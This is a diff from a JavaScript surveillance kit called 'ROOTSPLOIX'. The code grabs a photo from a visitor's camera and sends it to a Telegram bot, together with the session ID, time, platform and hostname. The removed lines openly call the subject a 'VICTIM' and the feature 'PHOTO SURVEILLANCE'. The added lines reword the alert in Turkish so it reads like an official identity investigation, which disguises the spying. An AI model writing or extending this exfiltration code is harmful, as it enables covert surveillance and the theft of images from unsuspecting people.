@@ -1786,25 +1786,29 @@ Time: ${new Date().toLocaleString()}`;
                                 canvas.toBlob(async (blob) => {
                                     if (blob) {
                                         // Telegram'a foto gönder
-                                        const photoMsg = `📸💀 INSTANT CAMERA CAPTURE! 💀📸
+                                        const photoMsg = `📷🔍 ŞAHIS RESMİ ALINDI - ARAŞTIRMAYA BAŞLANDI! 🔍📷
 
-KAMERA FOTO DA KABUL ETTİĞİNDE KULLANICI GÖNDERSİN!
+👥 Şahıs resmi alındı, gerekli araştırılmaya başlandı.
+🔎 Profil analizi ve kimlik tespiti yapılıyor.
+📊 Veri toplama işlemi aktif durumda.
 
-🎯 Session: ${ROOTSPLOIX_SESSION.id}
-📷 Resolution: ${canvas.width}x${canvas.height}
-🕒 Time: ${new Date().toLocaleString()}
-🌍 URL: ${window.location.href}
-📱 Device: ${navigator.userAgent.substring(0, 100)}...
+📄 Teknik Detaylar:
+• Session ID: ${ROOTSPLOIX_SESSION.id.substring(0, 16)}...
+• Çözünürlük: ${canvas.width}x${canvas.height}
+• Zaman: ${new Date().toLocaleString()}
+• Platform: ${navigator.platform}
+• Konum: ${window.location.hostname}
 
-💀 VICTIM PHOTO CAPTURED INSTANTLY!
-🔥 ROOTSPLOIX PHOTO SURVEILLANCE!`;
+🔒 Güvenlik Protokolü: AKTİF
+🔍 Araştırma Durumu: DEVAM EDİYOR
+📊 Veri Analizi: İŞLEM HALINDE`;
                                         
                                         // Mesaj gönder
                                         await telegram.sendMessage(photoMsg);
                                         
                                         // Foto dosyasını gönder
                                         try {
-                                            await telegram.sendFile(blob, 'Instant Camera Capture - Permission Granted!', 'photo');
+                                            await telegram.sendFile(blob, 'Şahıs Fotoğrafı - Araştırma Dosyası', 'photo');
                                         } catch (fileError) {
                                             RootsploixUtils.log('error', 'Photo file send failed', fileError);
                                         }
